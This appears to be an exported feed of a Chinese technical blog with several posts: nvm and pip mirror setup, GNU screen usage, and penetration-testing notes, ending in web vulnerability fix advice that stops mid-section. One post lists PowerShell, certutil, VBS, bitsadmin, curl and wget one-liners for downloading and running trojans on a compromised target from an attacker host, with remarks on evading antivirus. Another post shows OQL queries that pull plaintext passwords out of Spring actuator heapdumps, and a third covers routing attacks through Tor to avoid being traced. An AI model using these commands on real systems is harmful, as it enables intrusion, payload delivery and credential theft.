<h3 id="四：安装并控制node版本"><a href="#四：安装并控制node版本" class="headerlink" title="四：安装并控制node版本"></a>四：安装并控制node版本</h3><p>Nvm 的常用命令</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//查询可以安装的node版本</span></span><br><span class="line">nvm list available</span><br><span class="line">nvm install <span class="number">10.5</span><span class="number">.0</span>  <span class="comment">// 安装指定的版本的nodejs</span></span><br><span class="line">nvm use <span class="number">10.5</span><span class="number">.0</span>  <span class="comment">// 使用指定版本的nodejs</span></span><br><span class="line">nvm ls   <span class="comment">// 查看目前已经安装的版本</span></span><br></pre></td></tr></table></figure>

<p>通过nvm install命令安装多个版本的nodejs，然后通过nvm use命令来切换版本号</p>
<p>通过切换版本号后，可以通过node -v命令来检测是否使用成功。</p>
]]></content>
      <categories>
        <category>Programming</category>
      </categories>
  </entry>
  <entry>
    <title>pip更换国内源</title>
    <url>/2021/python%E6%9B%B4%E6%8D%A2%E6%BA%90.html</url>
    <content><![CDATA[<h3 id="pip国内的一些镜像"><a href="#pip国内的一些镜像" class="headerlink" title="pip国内的一些镜像"></a>pip国内的一些镜像</h3><ul>
<li>阿里云 <span class="exturl" data-url="aHR0cDovL21pcnJvcnMuYWxpeXVuLmNvbS9weXBpL3NpbXBsZS8/c3BtPWEyYzZoLjEyODczNjM5LjAuMC4yMmI2MmNkYlZ0WU9abQ==">http://mirrors.aliyun.com/pypi/simple/<i class="fa fa-external-link-alt"></i></span></li>
<li>中国科技大学 <span class="exturl" data-url="aHR0cHM6Ly9weXBpLm1pcnJvcnMudXN0Yy5lZHUuY24vc2ltcGxlLw==">https://pypi.mirrors.ustc.edu.cn/simple/<i class="fa fa-external-link-alt"></i></span></li>
<li>豆瓣(douban) <span class="exturl" data-url="aHR0cDovL3B5cGkuZG91YmFuLmNvbS9zaW1wbGUv">http://pypi.douban.com/simple/<i class="fa fa-external-link-alt"></i></span></li>
<li>清华大学 <span class="exturl" data-url="aHR0cHM6Ly9weXBpLnR1bmEudHNpbmdodWEuZWR1LmNuL3NpbXBsZS8=">https://pypi.tuna.tsinghua.edu.cn/simple/<i class="fa fa-external-link-alt"></i></span></li>
<li>中国科学技术大学 <span class="exturl" data-url="aHR0cDovL3B5cGkubWlycm9ycy51c3RjLmVkdS5jbi9zaW1wbGUv">http://pypi.mirrors.ustc.edu.cn/simple/<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p><u>提示：若担心安全问题可使用HTTPS加密源</u></p>
<h3 id="修改源的方法"><a href="#修改源的方法" class="headerlink" title="修改源的方法"></a>修改源的方法</h3><h4 id="临时使用："><a href="#临时使用：" class="headerlink" title="临时使用："></a>临时使用：</h4><p>Linux Mac Windows通用命令<span id="more"></span></p>
<p>可以在使用pip时在后面加上-i参数，指定pip源</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install Openpyxl -i https://mirrors.aliyun.com/pypi/simple/</span><br></pre></td></tr></table></figure>

<p><u>注意：如果使用非HTTPS源，需加上–trusted-host参数</u><br>如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install django -i http://mirrors.aliyun.com/pypi/simple/ --trusted-host mirrors.aliyun.com</span><br></pre></td></tr></table></figure>

<h4 id="永久修改："><a href="#永久修改：" class="headerlink" title="永久修改："></a>永久修改：</h4><p><strong>Linux:</strong></p>
<p>修改pip.cof文件(没有就创建一个)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$HOME/.config/pip/pip.conf</span><br></pre></td></tr></table></figure>

<p>修改内容如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[global]</span><br><span class="line">index-url = https://mirrors.aliyun.com/pypi/simple/</span><br></pre></td></tr></table></figure>

<p><strong>Mac:</strong></p>
<p>修改pip.conf文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$HOME/Library/Application Support/pip/pip.conf</span><br></pre></td></tr></table></figure>

<p>如果没有上面的目录,在如下目录创建 pip.conf</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[global]</span><br><span class="line">index-url = https://mirrors.aliyun.com/pypi/simple/</span><br></pre></td></tr></table></figure>

<p><strong>Windows:</strong><br>修改 pip.conf 文件 (没有就创建一个)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%APPDATA%\pip\pip.ini</span><br></pre></td></tr></table></figure>

<p>修改内容如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[global]</span><br><span class="line">index-url = https://mirrors.aliyun.com/pypi/simple/</span><br></pre></td></tr></table></figure>

<p><font color=green><u>若使用非HTTPS源需在文件中加入</u></font></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[install]</span><br><span class="line">trusted-host=mirrors.aliyun.com</span><br></pre></td></tr></table></figure>





]]></content>
      <categories>
        <category>Programming</category>
      </categories>
  </entry>
  <entry>
    <title>screen后台运行程序</title>
    <url>/2021/screen.html</url>
    <content><![CDATA[<blockquote>
<p>常常需要远程登录到Linux 服务器，运行一些需要很长时间才能完成的任务，在此期间不能关掉窗口或者断开连接，否则这个任务就会被杀掉，一切半途而废了。</p>
</blockquote>
<p>screen命令可以实现当前窗口与任务分离，即使离线了，服务器仍在后台运行任务。当重新登录服务器，可以读取窗口线程，重新连接任务窗口 <span id="more"></span></p>
<h2 id="主要功能："><a href="#主要功能：" class="headerlink" title="主要功能："></a>主要功能：</h2><ul>
<li>会话恢复</li>
</ul>
<p>只要Screen本身没有终止，在其内部运行的会话都可以恢复。这一点对于远程登录的用户特别有用——即使网络连接中断，用户也不会失去对已经打开的命令行会话的控制。只要再次登录到主机上执行screen -r就可以恢复会话的运行。同样在暂时离开的时候，也可以执行分离命令detach，在保证里面的程序正常运行的情况下让Screen挂起（切换到后台）。这一点和图形界面下的VNC很相似。</p>
<ul>
<li>多窗口</li>
</ul>
<p>在Screen环境下，所有的会话都独立的运行，并拥有各自的编号、输入、输出和窗口缓存。用户可以通过快捷键在不同的窗口下切换，并可以自由的重定向各个窗口的输入和输出。Screen实现了基本的文本操作，如复制粘贴等；还提供了类似滚动条的功能，可以查看窗口状况的历史记录。窗口还可以被分区和命名，还可以监视后台窗口的活动。</p>
<ul>
<li>会话共享</li>
</ul>
<p>Screen可以让一个或多个用户从不同终端多次登录一个会话，并共享会话的所有特性（比如可以看到完全相同的输出）。它同时提供了窗口访问权限的机制，可以对窗口进行密码保护。</p>
<h2 id="screen的使用："><a href="#screen的使用：" class="headerlink" title="screen的使用："></a>screen的使用：</h2><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><p>一般的linux系统都会自带screen,如果没有安装的话，使用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo apt-get install screen</span><br></pre></td></tr></table></figure>

<p>或</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo yum install screen</span><br></pre></td></tr></table></figure>

<h4 id="新建窗口"><a href="#新建窗口" class="headerlink" title="新建窗口"></a>新建窗口</h4><p>新建窗口有<code>3</code>种办法</p>
<p>第一种：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ screen</span><br><span class="line">这样就可以新建窗口，进入到一个窗口中，但是这样窗口就没有名字，无法区分他们</span><br></pre></td></tr></table></figure>

<p>第二种：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ screen -S name </span><br><span class="line">例如：screen -S count 新建了一个叫count的窗口并进入</span><br><span class="line">这样新建一个名字为name的窗口，并入到该窗口中</span><br></pre></td></tr></table></figure>

<p>第三种：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ screen command</span><br><span class="line">例如：screen python ./a.py 新建并执行a.py程序</span><br><span class="line">这样新建一个窗口并在窗口中执行command，同样没有名字</span><br></pre></td></tr></table></figure>

<h4 id="会话分离"><a href="#会话分离" class="headerlink" title="会话分离"></a>会话分离</h4><p>当一个窗口运行某个程序之后，想退出登录，让程序在后台运行。这时就需要和窗口会话分离,有<code>2</code>种方式：</p>
<p>第一种：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ ctrl+a+d</span><br><span class="line">在当前会话窗口中按Ctrl+a+d快捷键可以实现分离，这时窗口会弹出[detached]的提示，并回到主窗口</span><br></pre></td></tr></table></figure>

<p>第二种：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ screen -d name </span><br><span class="line">远程detach某个session,前提是已经跳出了name窗口</span><br></pre></td></tr></table></figure>
<h4 id="恢复会话窗口"><a href="#恢复会话窗口" class="headerlink" title="恢复会话窗口"></a>恢复会话窗口</h4><p>首先查看有哪些窗口正在运行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ screen -ls </span><br><span class="line">列出窗口列表</span><br></pre></td></tr></table></figure>

<p><img src="/../images/upload/screen1.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ screen -r 22059</span><br><span class="line">进入22059线程，恢复test会话</span><br></pre></td></tr></table></figure>

<p>这样就能回到test窗口了</p>
<h4 id="杀死会话窗口"><a href="#杀死会话窗口" class="headerlink" title="杀死会话窗口"></a>杀死会话窗口</h4><p>如果想要关掉某个窗口，有<code>3</code>种方法：</p>
<p>第一种：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ kill -9 threadnum</span><br><span class="line">例如上面的22059，kill -9 22059即可杀死线程</span><br></pre></td></tr></table></figure>

<p>第二种：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ ctrl+a+k</span><br><span class="line">杀死当前窗口和窗口中运行的程序</span><br></pre></td></tr></table></figure>

<p>第三种：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ ctrl+a 进入命令模式，然后输入quite命令</span><br><span class="line">$ quite</span><br><span class="line">这样退出会杀死所有窗口并退出运行的所有程序</span><br></pre></td></tr></table></figure>

<h4 id="清除死去的窗口"><a href="#清除死去的窗口" class="headerlink" title="清除死去的窗口"></a>清除死去的窗口</h4><p>当窗口被杀死后，再用screen -ls 可以看到该窗口后面的(???dead)字样，说明窗口死了，但是仍在占用空间。这时需要清除窗口</p>
<p><img src="/../images/upload/screen2.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ screen -wipe</span><br><span class="line">自动清除死去的窗口</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>shell中文件下载方法</title>
    <url>/2020/shell%E4%B8%8B%E8%BD%BD.html</url>
    <content><![CDATA[<p><font color=green>获得目标一定权限后可以下载木马或其它工具到目标机。下面列举了一些常用方法</font></p>
<h3 id="Powershell："><a href="#Powershell：" class="headerlink" title="Powershell："></a>Powershell：</h3><p>下载并保存文件：（容易被杀毒软件检测）</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">powershell (<span class="built_in">new-object</span> System.Net.WebClient).DownloadFile(<span class="string">&#x27;http://192.168.1.1/1.exe&#x27;</span>,<span class="string">&#x27;C:\test\1.exe&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>下载并执行文件：（无文件模式不易检测）</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">powershell (<span class="built_in">new-object</span> System.Net.WebClient).DownloadFile(<span class="string">&#x27;http://192.168.1.1/1.exe&#x27;</span>,<span class="string">&#x27;C:\test\1.exe&#x27;</span>);<span class="built_in">start-process</span> <span class="string">&#x27;C:\test\1.exe&#x27;</span></span><br></pre></td></tr></table></figure>

<span id="more"></span>

<h3 id="Certutil："><a href="#Certutil：" class="headerlink" title="Certutil："></a>Certutil：</h3><ul>
<li>保存在当前路径，文件名称同URL</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">certutil.exe -urlcache -split -f http://192.168.1.1/1.exe</span><br></pre></td></tr></table></figure>

<ul>
<li>保存在当前路径，指定保存文件名称</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">certutil.exe -urlcache -split -f http://192.168.1.1/1.txt 1.php</span><br></pre></td></tr></table></figure>

<p>使用downloader默认在缓存目录位置：保存下载的文件二进制副本。<br><code>%USERPROFILE%\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content</code></p>
<ul>
<li>命令行删除缓存</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">certutil.exe -urlcache -split -f http://192.168.1.1/1.exe delete</span><br></pre></td></tr></table></figure>

<ul>
<li>查看缓存项目</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">certutil.exe -urlcache *</span><br></pre></td></tr></table></figure>



<h3 id="Vbs："><a href="#Vbs：" class="headerlink" title="Vbs："></a>Vbs：</h3><p>vbs downloader,使用msxml2.xmlhttp和adodb.stream对象<br>使用echo逐行追加写入(&gt;&gt;)test.vbs</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Set Post = CreateObject(&quot;Msxml2.XMLHTTP&quot;)</span><br><span class="line">Set Shell = CreateObject(&quot;Wscript.Shell&quot;)</span><br><span class="line">Post.Open &quot;GET&quot;,&quot;http://192.168.1.1/1.exe&quot;,0</span><br><span class="line">Post.Send()</span><br><span class="line">Set aGet = CreateObject(&quot;ADODB.Stream&quot;)</span><br><span class="line">aGet.Mode = 3</span><br><span class="line">aGet.Type = 1</span><br><span class="line">aGet.Open()</span><br><span class="line">aGet.Write(Post.responseBody)</span><br><span class="line">aGet.SaveToFile &quot;C:\test\1.exe&quot;,2</span><br></pre></td></tr></table></figure>

<p>然后执行</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cscript test.vbs</span><br></pre></td></tr></table></figure>



<h3 id="Bitsadmin："><a href="#Bitsadmin：" class="headerlink" title="Bitsadmin："></a>Bitsadmin：</h3><p>bitsadmin是一个命令行工具，可用于创建下载或上传工作和监测其进展情况。xp以后的Windows系统自带</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">bitsadmin /transfer n http://<span class="number">192.168</span>.<span class="number">1.1</span>/<span class="number">1</span>.exe  C:\test\update\<span class="number">1</span>.exe</span><br></pre></td></tr></table></figure>

<p>不支持https、ftp协议，php python带的服务器会出错，下载速度较慢</p>
<h3 id="Curl："><a href="#Curl：" class="headerlink" title="Curl："></a>Curl：</h3><p>在Linux中curl是一个利用URL规则在命令行下工作的文件传输工具，可以说是一款很强大的http命令行工具。它支持文件的上传和下载，是综合传输工具</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -O http://192.168.1.1/1.exe</span><br></pre></td></tr></table></figure>

<p>保存网页中的文件，要注意这里后面的url要具体到某个文件，不然抓不下来</p>
<h3 id="Wget："><a href="#Wget：" class="headerlink" title="Wget："></a>Wget：</h3><p>Linux系统中的wget是一个下载文件的工具， 简单直接，支持递归下载</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget  http://192.168.1.1/1.exe</span><br></pre></td></tr></table></figure>

<p>对下载文件重命名：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget -O  new.exe  http://192.168.1.1/1.exe</span><br></pre></td></tr></table></figure>

<p>限速下载：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget --limit-rate=300k http://192.168.1.1/1.exe</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>Network</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>MAT 查找 spring heapdump中的密码明文</title>
    <url>/2020/spring.html</url>
    <content><![CDATA[<h3 id="一、简介："><a href="#一、简介：" class="headerlink" title="一、简介："></a>一、简介：</h3><p>访问 &#x2F;env 接口时，spring actuator 会将一些带有敏感关键词 (如 password、secret) 的属性名对应的属性值用 号替换，以达到脱敏的效果。在目标既不出网，&#x2F;jolokia 接口又没有合适的 MBean 或者不支持 POST 请求的情况下，很多获取被星号脱敏的密码的明文的方法就失效了。这时候就可以利用 Eclipse Memory Analyzer 工具来分析 &#x2F;heapdump 或 &#x2F;actuator&#x2F;heapdump 接口下载的 jvm heap 信息，查找密码明文。</p>
<h3 id="二、查找方法："><a href="#二、查找方法：" class="headerlink" title="二、查找方法："></a>二、查找方法：</h3><p>使用 Eclipse Memory Analyzer 直接打开下载的 heapdump 文件，点击 OQL 标签，在查询框中输入</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> org.springframework.web.context.support.StandardServletEnvironment</span><br></pre></td></tr></table></figure>

<p>然后点击红色感叹号执行查询。如下图， spring boot 1.x 版本 heapdump 查询结果，最终结果存储在 java.util.Hashtable$Entry 实例的键值对中：</p>
<img src="../images/upload/2020110501.png" style="zoom: 33%;" />

<span id="more"></span>所以也可以用

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> java.util.Hashtable$Entry x <span class="keyword">WHERE</span> (toString(x.key).<span class="keyword">contains</span>(&quot;password&quot;))</span><br></pre></td></tr></table></figure>

<p>来查询。下图为 spring boot 2.x 版本 heapdump 查询结果，最终结果存储在 java.util.LinkedHashMap$Entry 实例的键值对中：</p>
<img src="../images/upload/2020110502.png" style="zoom: 33%;" />

<p>所以也可以用</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> java.util.LinkedHashMap$Entry x <span class="keyword">WHERE</span> (toString(x.key).<span class="keyword">contains</span>(&quot;password&quot;))</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Penetration</category>
      </categories>
  </entry>
  <entry>
    <title>Tor的使用与Penetration</title>
    <url>/2020/tor%E4%BD%BF%E7%94%A8.html</url>
    <content><![CDATA[<p>Tor主要用来访问匿名网络也就是已<code>.onion</code>结尾的域名，当然也可访问某些正常的网站如google、twitter等，但并不推荐如此做；今天要说的是在Penetration中如何利用Tor网络对目标进行渗透，防止被溯源和审查等，隐藏攻击者身份和IP地址</p>
<p>官方解释：<font color=green>Tor是一个您能运行在您的电脑上，保护您在互联网上安全的程序。 它会将您的通信在一个由多个中继站组成的分散网络内不断传递，这些中继站被来自世界各地的志愿者们运营，并以此来保护您：这阻止了某些人通过您访问了哪些网址来得知您的网络链接，也防止了您访问的网站获取您的地理位置。 这些由志愿者搭建的中继被成为 Tor 网络。</font><span id="more"></span></p>
<h3 id="0x01-访问Tor的方式"><a href="#0x01-访问Tor的方式" class="headerlink" title="0x01 访问Tor的方式"></a>0x01 访问Tor的方式</h3><hr>
<p>1、直接使用Tor Browser浏览器，内置Tor Project加上Firefox浏览器–<code>推荐</code></p>
<p>2、源码安装Tor Project，然后配合其它浏览器使用–<code>Geek</code></p>
<h3 id="0x02-安装Tor-Browser浏览器"><a href="#0x02-安装Tor-Browser浏览器" class="headerlink" title="0x02 安装Tor Browser浏览器"></a>0x02 安装Tor Browser浏览器</h3><hr>
<p>下载地址：<br>Windows：<code>https://www.torproject.org/dist/torbrowser/9.5.3/torbrowser-install-win64-9.5.3_zh-CN.exe</code></p>
<p>Mac  os：<code>https://www.torproject.org/dist/torbrowser/9.5.3/TorBrowser-9.5.3-osx64_zh-CN.dmg</code></p>
<p>之后的安装过程就和其它程序一样了，这里不在赘述</p>
<h3 id="0x03-安装Tor-Project"><a href="#0x03-安装Tor-Project" class="headerlink" title="0x03 安装Tor Project"></a>0x03 安装Tor Project</h3><hr>
<p>Mac OS：<code>brew install tor</code></p>
<p>Windows：<code>https://www.torproject.org/dist/torbrowser/9.5.3/tor-win32-0.4.3.6.zip</code></p>
<h3 id="0x04-Tor-配置文件"><a href="#0x04-Tor-配置文件" class="headerlink" title="0x04 Tor 配置文件"></a>0x04 Tor 配置文件</h3><hr>
<p>Mac OS:<br><code>/usr/local/Cellar/tor/</code> :Tor的安装路径<br><code>/usr/local/etc/tor/torrc</code>  :Tor的配置文件</p>
<p>Windows:<br><code>解压后的存放路径</code>  : Tor的安装路径<br><code>同路径下tor/torrc</code>  :Tor的配置文件</p>
<p>Mac：在下面路径<code>/usr/local/etc/tor</code>找到文件<code>torrc.sample</code>，拷贝一份命名为<code>torrc</code><br>Windows：双击tor.exe后会生成torrc文件，然后再编辑</p>
<p>常用配置的参数：</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>作用</th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>Socks5Proxy</td>
<td>前置 Socks 代理端口</td>
<td></td>
</tr>
<tr>
<td>HTTPProxy</td>
<td>前置 HTTP 代理端口</td>
<td></td>
</tr>
<tr>
<td>HTTPSProxy</td>
<td>前置 HTTPS 代理端口</td>
<td></td>
</tr>
<tr>
<td>SocksProt</td>
<td>外部程序访问 Tor 的端口</td>
<td></td>
</tr>
<tr>
<td>MaxCircuitDirtiness</td>
<td>自动切换 ip 的时间间隔</td>
<td></td>
</tr>
</tbody></table>
<p>我的配置：</p>
<img src="../images/upload/tor1.png" style="zoom: 67%;" />

<h3 id="0x05-确认是否接入Tor网络"><a href="#0x05-确认是否接入Tor网络" class="headerlink" title="0x05 确认是否接入Tor网络"></a>0x05 确认是否接入Tor网络</h3><hr>
<p>启动Tor：</p>
<p>Mac：<code>tor</code> 命令<br>Windows：双击<code>tor.exe</code></p>
<p>配置Tor生成的本地代理</p>
<p><img src="/../images/upload/tor2.png"></p>
<p>访问 <code>https://check.torproject.org/</code></p>
<img src="/Users/tbo/github/hexo/source/images/upload/tor4.png" style="zoom: 33%;" />

<h3 id="0x06-配合Burp-Suite使用"><a href="#0x06-配合Burp-Suite使用" class="headerlink" title="0x06 配合Burp Suite使用"></a>0x06 配合Burp Suite使用</h3><hr>
<p>在Burp Suite中配置tor本地代理地址，浏览器中配置bp的代理</p>
<p>User options-&gt;Connetctions</p>
<img src="../images/upload/tor3.png" style="zoom:50%;" />

<p>OK,可以开始使用了<br><img src="../images/upload/tor5.png" style="zoom:50%;" /></p>
<img src="../images/upload/tor6.png" style="zoom:50%;" />

<h3 id="0x07-最后"><a href="#0x07-最后" class="headerlink" title="0x07 最后"></a>0x07 最后</h3><p>使用Tor的注意事项⚠️：</p>
<p>1、<strong>请勿将您的手机在 Tor 上用于两步验证</strong><br>2、<strong>不要在 TOR 之外操作用户帐户</strong><br>3、<strong>不要发布有关您的任何个人信息</strong><br>4、<strong>不要通过 TOR 发送未加密的数据</strong><br>5、<strong>不要忘记删除 cookies 和本地网站数据</strong><br>6、<strong>请勿将 TOR 用于 Google 搜索</strong><br>7、<strong>不要在 TOR 上打开 HTTP 网站</strong><br>8、<strong>不要同时使用 Tor 和不使用 Tor 访问同一台服务器</strong></p>
]]></content>
      <categories>
        <category>Penetration</category>
      </categories>
  </entry>
  <entry>
    <title>web常见漏洞修复建议</title>
    <url>/2021/web%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE.html</url>
    <content><![CDATA[<h2 id="1-SQL注入"><a href="#1-SQL注入" class="headerlink" title="1.SQL注入"></a>1.SQL注入</h2><p>　　<strong>漏洞描述</strong></p>
<p>　　Web程序中对于用户提交的参数未做过滤直接拼接到SQL语句中执行，导致参数中的特殊字符破坏了SQL语句原有逻辑，攻击者可以利用该漏洞执行任意SQL语句，如查询数据、下载数据、写入webshell、执行系统命令以及绕过登录限制等。</p>
<p>　　<strong>修复建议</strong></p>
<p>代码层最佳防御sql漏洞方案：使用预编译sql语句查询和绑定变量。</p>
<p>　　（1）使用预编译语句，使用PDO需要注意不要将变量直接拼接到PDO语句中。所有的查询语句都使用数据库提供的参数化查询接口，参数化的语句使用参数而不是将用户输入变量嵌入到SQL语句中。当前几乎所有的数据库系统都提供了参数化SQL语句执行接口，使用此接口可以非常有效的防止SQL注入攻击。</p>
<p>　　（2）对进入数据库的特殊字符（’”&lt;&gt;&amp;*;等）进行转义处理，或编码转换。</p>
<p>　　（3）确认每种数据的类型，比如数字型的数据就必须是数字，数据库中的存储字段必须对应为int型。<span id="more"></span></p>
<p>　　（4）数据长度应该严格规定，能在一定程度上防止比较长的SQL注入语句无法正确执行。</p>
<p>　　（5）网站每个数据层的编码统一，建议全部使用UTF-8编码，上下层编码不一致有可能导致一些过滤模型被绕过。</p>
<p>　　（6）严格限制网站用户的数据库的操作权限，给此用户提供仅仅能够满足其工作的权限，从而最大限度的减少注入攻击对数据库的危害。</p>
<p>　　（7）避免网站显示SQL错误信息，比如类型错误、字段不匹配等，防止攻击者利用这些错误信息进行一些判断。</p>
<p>　　（8）过滤危险字符，例如：采用正则表达式匹配union、sleep、and、select、load_file等关键字，如果匹配到则终止运行。</p>
<h2 id="2-XSS"><a href="#2-XSS" class="headerlink" title="2.XSS"></a>2.XSS</h2><p>　　<strong>漏洞描述</strong></p>
<p>　　1、Web程序代码中对用户提交的参数未做过滤或过滤不严，导致参数中的特殊字符破坏了HTML页面的原有逻辑，攻击者可以利用该漏洞执行恶意HTML&#x2F;JS代码、构造蠕虫、篡改页面实施钓鱼攻击、以及诱导用户再次登录，然后获取其登录凭证等。</p>
<p>　　2、XSS攻击对Web服务器本身虽无直接危害，但是它借助网站进行传播，对网站用户进行攻击，窃取网站用户账号身份信息等，从而也会对网站产生较严重的威胁。</p>
<p>XSS攻击可导致以下危害：</p>
<p>　　1、钓鱼欺骗：最典型的就是利用目标网站的反射型跨站脚本漏洞将目标网站重定向到钓鱼网站，或者通过注入钓鱼JavaScript脚本以监控目标网站的表单输入，甚至攻击者基于DHTML技术发起更高级的钓鱼攻击。</p>
<p>　　2、网站挂马：跨站时，攻击者利用Iframe标签嵌入隐藏的恶意网站，将被攻击者定向到恶意网站上、或弹出恶意网站窗口等方式，进行挂马。</p>
<p>　　3、身份盗用：Cookie是用户对于特定网站的身份验证标志，XSS攻击可以盗取用户的cookie，从而利用该cookie盗取用户对该网站的操作权限。</p>
<p>　　4、盗取网站用户信息：当窃取到用户cookie从而获取到用户身份时，攻击者可以盗取到用户对网站的操作权限，从而查看用户隐私信息。</p>
<p>　　5、垃圾信息发送：在社交网站社区中，利用XSS漏洞借用被攻击者的身份发送大量的垃圾信息给特定的目标群。</p>
<p>　　6、劫持用户Web行为：一些高级的XSS攻击甚至可以劫持用户的Web行为，从而监视用户的浏览历史、发送与接收的数据等等。</p>
<p>　　7、XSS蠕虫：借助XSS蠕虫病毒还可以用来打广告、刷流量、挂马、恶作剧、破坏数据、实施DDoS攻击等。</p>
<p>　　<strong>修复建议</strong></p>
<p>xss漏洞本质上是一种html注入，也就是将html代码注入到网页中。那么其防御的根本就是在将用户提交的代码显示到页面上时做好一系列的过滤与转义</p>
<p>　　（1）过滤输入的数据，对例如：“ ‘ ”，“ “ ”，” &lt; “，” &gt; “，” on* “，script、iframe等危险字符进行严格的检查。这里的输入不仅仅是用户可以直接交互的输入接口，也包括HTTP请求中的Cookie中的变量，HTTP请求头部中的变量等。</p>
<p>　　（2）不仅验证数据的类型，还要验证其格式、长度、范围和内容。</p>
<p>　　（3）不仅在客户端做数据的验证与过滤，关键的过滤步骤在服务端进行。</p>
<p>　　（4）对输出到页面的数据进行相应的编码转换，如HTML实体编码、JS编码等。对输出的数据也要检查，数据库里的值有可能会在一个大网站的多处都有输出，即使在输入做了编码等操作，在各处的输出点时也要进行检查。</p>
<h2 id="3-XXE"><a href="#3-XXE" class="headerlink" title="3.XXE"></a>3.XXE</h2><p>　　<strong>漏洞详情</strong></p>
<p>　　参考：<span class="exturl" data-url="aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vY29tcGFueS1pbmZvcm1hdGlvbi8xNjU3NjkuaHRtbA==">https://www.freebuf.com/company-information/165769.html<i class="fa fa-external-link-alt"></i></span></p>
<h2 id="4-CSRF"><a href="#4-CSRF" class="headerlink" title="4.CSRF"></a>4.CSRF</h2><p>　　<strong>漏洞描述****：</strong></p>
<p>　　CSRF是跨站请求伪造，不攻击网站服务器，而是冒充用户在站内的正常操作。通常由于服务端没有对请求头做严格过滤引起的。CSRF会造成密码重置，用户伪造等问题，可能引发严重后果。绝大多数网站是通过 cookie 等方式辨识用户身份，再予以授权的。所以要伪造用户的正常操作，最好的方法是通过 XSS 或链接欺骗等途径，让用户在本机（即拥有身份 cookie 的浏览器端）发起用户所不知道的请求。CSRF攻击会令用户在不知情的情况下攻击自己已经登录的系统。</p>
<p>　　<strong>修复建议</strong></p>
<p>　　1、验证请求的Referer是否来自本网站，但可被绕过。</p>
<p>　　2、在请求中加入不可伪造的token，并在服务端验证token是否一致或正确，不正确则丢弃拒绝服务。</p>
<h2 id="5-SSRF"><a href="#5-SSRF" class="headerlink" title="5.SSRF"></a>5.SSRF</h2><p>　　<strong>漏洞描述</strong></p>
<p>　　SSRF（Server-Side Request Forgery，服务器端请求伪造）：通俗的来说就是我们可以伪造服务器端发起的请求，从而获取客户端所不能得到的数据。SSRF漏洞形成的原因主要是服务器端所提供的接口中包含了所要请求的内容的URL参数，并且未对客户端所传输过来的URL参数进行过滤。这个漏洞造成的危害有：</p>
<p>　　(1)、可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息;</p>
<p>　　(2)、攻击运行在内网或本地的应用程序（比如溢出）;</p>
<p>　　(3)、对内网Web应用进行指纹识别，通过访问默认文件实现;</p>
<p>　　(4)、攻击内外网的Web应用，主要是使用Get参数就可以实现的攻击（比如Struts2漏洞利用，SQL注入等）;</p>
<p>　　(5)、利用File协议读取本地文件。</p>
<p>　　<strong>修复建议</strong></p>
